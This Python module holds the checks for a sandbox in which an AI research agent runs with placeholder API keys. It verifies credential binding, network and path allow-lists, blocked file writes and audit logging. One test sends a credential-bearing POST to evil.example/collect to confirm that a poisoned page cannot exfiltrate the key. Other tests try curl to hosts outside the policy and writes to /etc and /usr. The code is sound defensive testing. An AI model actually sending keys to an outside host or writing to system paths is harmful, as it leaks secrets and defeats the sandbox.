"""The OpenShell checks (the notebook only calls these): run_agent, show_agent_work, run_checks, audit, summary.
DENIED = blocked by policy, REACHED = went through."""
import json, os, re, subprocess, sys, time
from collections import Counter

import case
sys.path.insert(0, str(case.HERE.parent))        # agent.py lives next to the sandbox folder
import agent

CASE = case.HERE
NAMES = case.KEYS
results = []


def check(group, name, ok, detail=""):
    results.append((group, name, bool(ok)))
    print(("PASS" if ok else "FAIL"), f"[{group}] {name}" + (f"  -> {detail}" if detail else ""))


def probe(method, url, var="NEBIUS_API_KEY"):
    """One request from inside the sandbox (app/probe.py); the Authorization header carries $var, a placeholder there."""
    return case.run_in("python", "/sandbox/app/probe.py", method, url, var)[1].splitlines()[-1]


def run_agent(topics=()):
    """The agent runs inside the sandbox with placeholders instead of keys; findings are copied out.
    topics: candidate course topics for the lead (default: all)."""
    rc, out = case.run_in("python", "/sandbox/app/main.py", *topics, timeout=600)
    print("\n".join(out.splitlines()[-5:]))
    rc2, raw = case.run_in("cat", "/sandbox/runs/findings.json")
    findings = json.loads(raw) if rc2 == 0 else []
    target = CASE / "findings.json"
    target.write_text(json.dumps(findings, ensure_ascii=False, indent=1))
    for f in findings:
        print(f"  {f['date']:11} [{f['topic']}] ({f['kind']}) {f['title'][:78]}\n              {f['url'][:100]}")
    print(f"saved: {target}  ({len(findings)} findings)")
    return findings


def show_agent_work():
    """Model calls per role, searches and the latest trace events of the run in the sandbox."""
    rc, raw = case.run_in("cat", "/sandbox/runs/traces.jsonl")
    path = CASE / "traces.jsonl"
    path.write_text(raw if rc == 0 else "")
    events = [json.loads(line) for line in raw.splitlines() if line.strip()] if rc == 0 else []
    calls = Counter((e["role"], e["model"]) for e in events if e["kind"] == "model_call")
    for (role, model), n in sorted(calls.items()):
        print(f"  {role:6} {model}: {n} model calls")
    print(f"  searches: {sum(e['kind'] == 'tool_call' for e in events)}, "
          f"workers: {sum(e['kind'] == 'worker_done' for e in events)}, trace events: {len(events)}")
    print()
    agent.show_traces(14, path)


def run_checks(findings):
    run_in = case.run_in

    # --- the agent itself
    check("radar", "the agent ran inside the sandbox and produced findings", len(findings) >= 1, f"{len(findings)} findings")
    check("radar", "every finding has an https url and a topic", all(f["url"].startswith("https://") and f["topic"] for f in findings))

    # --- credentials: the sandbox holds placeholders only
    env_dump = run_in("env")[1]
    for var in NAMES:
        inside = re.search(rf"^{var}=(.*)$", env_dump, flags=re.M).group(1)
        check("credentials", f"{var} inside the sandbox is a placeholder", inside.startswith("openshell:resolve:env:"), inside[:40] + "...")
    check("credentials", "the real key values do not appear anywhere in the sandbox environment",
          not any(os.environ[v] in env_dump for v in NAMES))
    check("credentials", "the Nebius credential cannot be used against Tavily (credential binding)",
          probe("POST", "https://api.tavily.com/search", "NEBIUS_API_KEY") == "DENIED credential-binding")
    check("credentials", "the Tavily credential cannot be used against Nebius (credential binding)",
          probe("GET", "https://api.tokenfactory.nebius.com/v1/models", "TAVILY_API_KEY") == "DENIED credential-binding")
    check("credentials", "a poisoned page cannot exfiltrate the key: POST to evil.example is denied",
          probe("POST", "https://evil.example/collect").startswith("DENIED"))

    # --- network
    check("network", "allowed: GET api.tokenfactory.nebius.com/v1/models with the right credential", probe("GET", "https://api.tokenfactory.nebius.com/v1/models") == "REACHED 200")
    check("network", "denied host: an article page (arxiv.org) cannot be fetched directly", probe("GET", "https://arxiv.org/abs/2611.14320").startswith("DENIED"))
    check("network", "denied method: GET api.tavily.com/search", probe("GET", "https://api.tavily.com/search", "TAVILY_API_KEY") == "DENIED policy")
    check("network", "denied path: POST api.tavily.com/extract", probe("POST", "https://api.tavily.com/extract", "TAVILY_API_KEY") == "DENIED policy")
    check("network", "denied path: POST api.tokenfactory.nebius.com/v1/embeddings", probe("POST", "https://api.tokenfactory.nebius.com/v1/embeddings") == "DENIED policy")
    rc, out = run_in("curl", "-sS", "-m", "10", "-X", "POST", "-d", "{}", "https://api.tavily.com/search")
    check("network", "denied program: curl cannot reach the allowed Tavily endpoint (only python may)", rc != 0 and "Couldn't connect" in out)
    rc, out = run_in("curl", "-sS", "-m", "10", "https://example.com")
    check("network", "denied host: curl example.com", rc != 0 and "Couldn't connect" in out)

    # --- filesystem and identity
    check("filesystem", "allowed: write to /sandbox/runs", run_in("sh", "-c", "echo ok > /sandbox/runs/t.txt && echo written")[1] == "written")
    check("filesystem", "allowed: write to /tmp", run_in("sh", "-c", "echo ok > /tmp/t.txt && echo written")[1] == "written")
    for path in ("/usr/x.txt", "/etc/x.txt", "/sandbox/app/agent.py"):
        rc, out = run_in("sh", "-c", f"echo x >> {path}")
        check("filesystem", f"denied: write to {path}", rc != 0 and "Permission denied" in out)
    check("identity", "the workload runs as the unprivileged user sandbox (uid 1500)", run_in("sh", "-c", "id -un; id -u")[1].split() == ["sandbox", "1500"])


def audit():
    """The audit log (polls up to ~30 s: logs reach the gateway with a delay) and the effective policy."""
    log = ""
    for _ in range(10):
        log = case.clean(subprocess.run(f"openshell logs {case.SANDBOX} --since 15m --source sandbox -n 600", shell=True, capture_output=True, text=True).stdout)
        if all(s in log for s in ("evil.example", "arxiv.org", "example.com", "credential_endpoint_mismatch")):
            break
        time.sleep(3)
    decisions = [l for l in log.splitlines() if re.search(r"NET:OPEN|HTTP:|NET:REFUSE", l) and re.search(r"DENIED|ALLOWED", l)]
    for l in decisions[-14:]:
        print(re.sub(r"^\[\d+\.\d+\] \[sandbox\] \[OCSF \] \[ocsf\] ", "", l)[:190])

    check("audit", "denial logged: evil.example (host not in policy)",     bool(re.search(r"DENIED.*evil\.example", log)))
    check("audit", "denial logged: arxiv.org (no direct page fetching)",   bool(re.search(r"DENIED.*arxiv\.org", log)))
    check("audit", "denial logged: example.com via curl",                  bool(re.search(r"DENIED.*example\.com", log)))
    check("audit", "denial logged: credential used against the wrong endpoint", "credential_endpoint_mismatch" in log)
    check("audit", "denial logged: L7 rule (wrong method or path)",        bool(re.search(r"HTTP:\w+ .*DENIED.*L7_REQUEST", log)))
    check("audit", "allowed traffic logged: Tavily and Token Factory",     bool(re.search(r"ALLOWED.*api\.tavily\.com", log)) and bool(re.search(r"ALLOWED.*api\.tokenfactory\.nebius\.com", log)))
    policy_text = case.sh(f"openshell policy get {case.SANDBOX} --full")[1]
    check("policy", "effective policy binds each endpoint to its provider", "radar-nebius" in policy_text and "radar-tavily" in policy_text)


def summary():
    groups = {}
    for group, _, ok in results:
        groups.setdefault(group, []).append(ok)
    print(f"{'group':12} {'passed':>7} {'total':>6}")
    for group, oks in groups.items():
        print(f"{group:12} {sum(oks):>7} {len(oks):>6}")
    passed = sum(ok for _, _, ok in results)
    print(f"\nTOTAL: {passed}/{len(results)} checks passed")
    assert passed == len(results), "some checks failed: see the FAIL lines above"
